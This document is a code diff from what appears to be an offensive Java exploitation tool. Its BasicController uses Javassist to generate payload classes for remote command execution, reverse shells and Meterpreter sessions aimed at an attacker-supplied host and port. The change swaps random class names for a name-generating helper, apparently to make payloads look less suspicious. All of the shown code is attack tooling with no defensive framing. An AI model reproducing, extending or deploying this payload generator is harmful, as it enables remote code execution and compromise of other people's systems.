@@ -39,7 +39,7 @@ public class BasicController implements Controller {
             url = "http://" + url;
         }
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         ClassFile classFile = new ClassFile(false, className, null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
@@ -58,7 +58,7 @@ public class BasicController implements Controller {
     public byte[] command(String cmd) throws Exception {
         System.out.println("[Command] Cmd: " + cmd);
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         ClassFile classFile = new ClassFile(false, className, null);
         classFile.setMajorVersion(ClassFile.JAVA_8);
@@ -92,7 +92,7 @@ public class BasicController implements Controller {
     public byte[] reverseShell(String host, String port) throws Exception {
         System.out.println("[ReverseShell]: Host: " + host + " Port: " + port);
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(ReverseShell.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
@@ -107,7 +107,7 @@ public class BasicController implements Controller {
     public byte[] meterpreter(String host, String port) throws Exception {
         System.out.println("[Meterpreter]: Host: " + host + " Port: " + port);
 
-        String className = MiscUtil.getRandStr(12);
+        String className = MiscUtil.getClassName();
         ClassPool pool = ClassPool.getDefault();
         CtClass clazz = pool.get(Meterpreter.class.getName());
         clazz.replaceClassName(clazz.getName(), className);
